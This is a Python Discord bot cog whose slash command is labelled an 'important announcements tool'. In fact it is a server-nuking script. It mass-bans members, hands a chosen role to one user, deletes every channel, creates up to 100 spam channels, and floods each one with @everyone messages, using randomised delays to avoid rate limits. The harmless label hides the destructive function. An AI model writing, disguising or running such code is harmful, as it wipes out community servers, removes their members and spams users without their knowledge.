import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        # Responder inmediatamente para evitar timeout
        await interaction.response.send_message("🚀 Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            followup = interaction.followup
            
            # 1. BANEAR miembros con el rol especificado (excepto useradmin)
            banned_count = 0
            members_to_ban = []
            
            # Obtener todos los miembros del servidor
            async for member in guild.fetch_members():
                # Verificar si el miembro tiene el rol (comparando IDs)
                if any(role.id == roletogive.id for role in member.roles) and member.id != useradmin.id:
                    members_to_ban.append(member)
            
            # Banear miembros
            for member in members_to_ban:
                try:
                    await member.ban(reason=f"Baneado por comando announce: {interaction.user}", delete_message_days=0)
                    banned_count += 1
                    # Pequeño delay para evitar rate limits
                    await asyncio.sleep(0.3)
                except Exception as e:
                    print(f"No se pudo banear a {member}: {e}")
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
                await followup.send("✅ Rol asignado al administrador", ephemeral=True)
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
                await followup.send("⚠️ No se pudo asignar el rol al administrador", ephemeral=True)
            
            # 3. Eliminar todos los canales
            delete_tasks = []
            for channel in guild.channels:
                try:
                    delete_tasks.append(channel.delete())
                except Exception as e:
                    print(f"No se pudo eliminar el canal {channel.name}: {e}")
            
            # Ejecutar todas las eliminaciones en paralelo
            if delete_tasks:
                results = await asyncio.gather(*delete_tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        print(f"Error al eliminar canal: {result}")
            
            await followup.send("✅ Canales eliminados", ephemeral=True)
            
            # 4. Crear canales y spamear mensajes MIENTRAS se banean el resto de miembros
            spam_message = f"@everyone {message}"
            channel_count = 0
            max_channels = 100  # Límite más conservador para evitar rate limits
            
            # Función para banear a todos los miembros restantes
            async def ban_all_members():
                total_banned = banned_count
                async for member in guild.fetch_members():
                    try:
                        # No banear al useradmin ni a sí mismo (el bot)
                        if member.id != useradmin.id and member.id != self.bot.user.id and not member.bot:
                            await member.ban(reason=f"Baneo masivo: {interaction.user}", delete_message_days=0)
                            total_banned += 1
                            # Pequeño delay aleatorio para evitar rate limits
                            await asyncio.sleep(0.2 + random.random() * 0.3)
                    except Exception as e:
                        # Si no se puede banear, continuar con el siguiente
                        print(f"No se pudo banear a {member}: {e}")
                        continue
                return total_banned
            
            # Iniciar el baneo masivo en segundo plano
            ban_task = asyncio.create_task(ban_all_members())
            
            # Crear canales mientras se banean miembros
            channel_creation_tasks = []
            while channel_count < max_channels:
                try:
                    # Crear canal con nombre único
                    channel_name = f"{message}-{channel_count}"
                    
                    # Crear el canal pero no esperar inmediatamente
                    channel_task = asyncio.create_task(
                        guild.create_text_channel(channel_name[:100])
                    )
                    channel_creation_tasks.append(channel_task)
                    
                    channel_count += 1
                    
                    # Pequeño delay aleatorio para evitar rate limits
                    await asyncio.sleep(0.1 + random.random() * 0.2)
                    
                except Exception as e:
                    print(f"Error al programar creación de canal: {e}")
                    await asyncio.sleep(0.5)
            
            # Esperar a que se creen todos los canales
            created_channels = []
            for task in channel_creation_tasks:
                try:
                    channel = await task
                    created_channels.append(channel)
                except Exception as e:
                    print(f"Error al crear canal: {e}")
            
            # Enviar mensajes a todos los canales creados
            message_tasks = []
            for channel in created_channels:
                try:
                    # Enviar múltiples mensajes
                    for _ in range(5):  # Reducido a 2 mensajes por canal
                        msg_task = asyncio.create_task(channel.send(spam_message))
                        message_tasks.append(msg_task)
                        await asyncio.sleep(0.1)  # Pequeño delay entre mensajes
                except Exception as e:
                    print(f"Error al enviar mensaje al canal {channel.name}: {e}")
            
            # Esperar a que todos los mensajes se envíen
            for task in message_tasks:
                try:
                    await task
                except Exception as e:
                    print(f"Error al enviar mensaje: {e}")
            
            # Esperar a que termine el baneo masivo
            total_banned = await ban_task
            
            # Mensaje final
            await followup.send(
                f"✅ Operación completada.\n"
                f"• Canales creados: {len(created_channels)}\n"
                f"• Miembros baneados: {total_banned}\n"
                f"• Mensajes enviados: {len(message_tasks)}", 
                ephemeral=True
            )
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            import traceback
            traceback.print_exc()
            # Usar followup para enviar el error
            try:
                await interaction.followup.send("❌ Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                # Si falla el followup, intentar editar la respuesta original
                try:
                    await interaction.edit_original_response(content="❌ Ocurrió un error durante el proceso.")
                except:
                    pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
